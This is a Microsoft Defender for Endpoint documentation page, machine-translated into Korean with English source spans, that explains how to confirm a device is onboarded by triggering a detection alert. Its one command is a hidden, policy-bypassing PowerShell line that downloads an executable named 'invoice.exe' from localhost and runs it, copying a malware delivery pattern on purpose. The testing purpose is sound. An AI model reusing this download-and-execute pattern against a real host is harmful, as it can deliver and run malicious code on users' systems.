---
title: 새로 온보딩된 엔드포인트 디바이스용 Microsoft Defender에서 검색 테스트 실행
description: 새로 온보딩된 장치에서 검색 스크립트를 실행하여 끝점용 Microsoft Defender 서비스에 제대로 온보딩되었는지 확인합니다.
keywords: 검색 테스트, 감지, powershell, 스크립트, 확인, 온보딩, 끝점 온보딩에 대한 Microsoft Defender, 클라이언트, 서버, 테스트
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10090fdd1dff6b020d06c82afa8456d7a157ff91
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 06/08/2021
ms.locfileid: "52843309"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a><span data-ttu-id="fe3df-104">새로 온보딩된 엔드포인트 디바이스용 Microsoft Defender에서 검색 테스트 실행</span><span class="sxs-lookup"><span data-stu-id="fe3df-104">Run a detection test on a newly onboarded Microsoft Defender for Endpoint device</span></span> 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


<span data-ttu-id="fe3df-105">**적용 대상:**</span><span class="sxs-lookup"><span data-stu-id="fe3df-105">**Applies to:**</span></span>
- <span data-ttu-id="fe3df-106">지원 Windows 10 버전</span><span class="sxs-lookup"><span data-stu-id="fe3df-106">Supported Windows 10 versions</span></span>
- <span data-ttu-id="fe3df-107">Windows Server 2012 R2</span><span class="sxs-lookup"><span data-stu-id="fe3df-107">Windows Server 2012 R2</span></span>
- <span data-ttu-id="fe3df-108">Windows Server 2016</span><span class="sxs-lookup"><span data-stu-id="fe3df-108">Windows Server 2016</span></span>
- <span data-ttu-id="fe3df-109">Windows 서버, 버전 1803</span><span class="sxs-lookup"><span data-stu-id="fe3df-109">Windows Server, version 1803</span></span>
- <span data-ttu-id="fe3df-110">Windows Server, 2019</span><span class="sxs-lookup"><span data-stu-id="fe3df-110">Windows Server, 2019</span></span>
- <span data-ttu-id="fe3df-111">[엔드포인트용 Microsoft Defender](https://go.microsoft.com/fwlink/?linkid=2154037) </span><span class="sxs-lookup"><span data-stu-id="fe3df-111">[Microsoft Defender for Endpoint](https://go.microsoft.com/fwlink/?linkid=2154037)</span></span>
- [<span data-ttu-id="fe3df-112">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="fe3df-112">Microsoft 365 Defender</span></span>](https://go.microsoft.com/fwlink/?linkid=2118804)

> <span data-ttu-id="fe3df-113">끝점용 Microsoft Defender를 경험하고 싶나요?</span><span class="sxs-lookup"><span data-stu-id="fe3df-113">Want to experience Microsoft Defender for Endpoint?</span></span> [<span data-ttu-id="fe3df-114">무료 평가판에 등록합니다.</span><span class="sxs-lookup"><span data-stu-id="fe3df-114">Sign up for a free trial.</span></span>](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

<span data-ttu-id="fe3df-115">새로 온보딩된 장치에서 다음 PowerShell 스크립트를 실행하여 끝점용 Defender 서비스에 올바르게 보고하고 있는지 확인합니다.</span><span class="sxs-lookup"><span data-stu-id="fe3df-115">Run the following PowerShell script on a newly onboarded device to verify that it is properly reporting to the Defender for Endpoint service.</span></span>

1. <span data-ttu-id="fe3df-116">폴더 만들기: 'C:\test-MDATP-test'.</span><span class="sxs-lookup"><span data-stu-id="fe3df-116">Create a folder:  'C:\test-MDATP-test'.</span></span>
2. <span data-ttu-id="fe3df-117">디바이스에서 상승된 명령줄 프롬프트를 열고 스크립트를 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="fe3df-117">Open an elevated command-line prompt on the device and run the script:</span></span>

   1. <span data-ttu-id="fe3df-118">**시작**(으)로 이동하고 **cmd** 를 입력하십시오.</span><span class="sxs-lookup"><span data-stu-id="fe3df-118">Go to **Start** and type **cmd**.</span></span>

   1. <span data-ttu-id="fe3df-119">명령 **프롬프트를 마우스 오른쪽 단추로 클릭하고** **관리자 권한으로 실행을 선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="fe3df-119">Right-click **Command Prompt** and select **Run as administrator**.</span></span>

      ![관리자 권한으로 실행을 설정하는 창 시작 메뉴](images/run-as-admin.png)

3. <span data-ttu-id="fe3df-121">프롬프트에서 다음 명령을 복사하여 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="fe3df-121">At the prompt, copy and run the following command:</span></span>

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

<span data-ttu-id="fe3df-122">명령 프롬프트 창이 자동으로 닫히게 됩니다.</span><span class="sxs-lookup"><span data-stu-id="fe3df-122">The Command Prompt window will close automatically.</span></span> <span data-ttu-id="fe3df-123">성공하면 검색 테스트가 완료된 것으로 표시하고 약 10분 후 온보드 장치에 대한 새 경고가 포털에 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="fe3df-123">If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in approximately 10 minutes.</span></span>

## <a name="related-topics"></a><span data-ttu-id="fe3df-124">관련 항목</span><span class="sxs-lookup"><span data-stu-id="fe3df-124">Related topics</span></span>
- [<span data-ttu-id="fe3df-125">그룹 정책을 통한 Windows 10 장치 온보딩</span><span class="sxs-lookup"><span data-stu-id="fe3df-125">Onboard Windows 10 devices</span></span>](configure-endpoints.md)
- [<span data-ttu-id="fe3df-126">서버 온보드</span><span class="sxs-lookup"><span data-stu-id="fe3df-126">Onboard servers</span></span>](configure-server-endpoints.md)
- [<span data-ttu-id="fe3df-127">끝점 온보딩 문제에 대한 Microsoft Defender 문제 해결</span><span class="sxs-lookup"><span data-stu-id="fe3df-127">Troubleshoot Microsoft Defender for Endpoint onboarding issues</span></span>](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
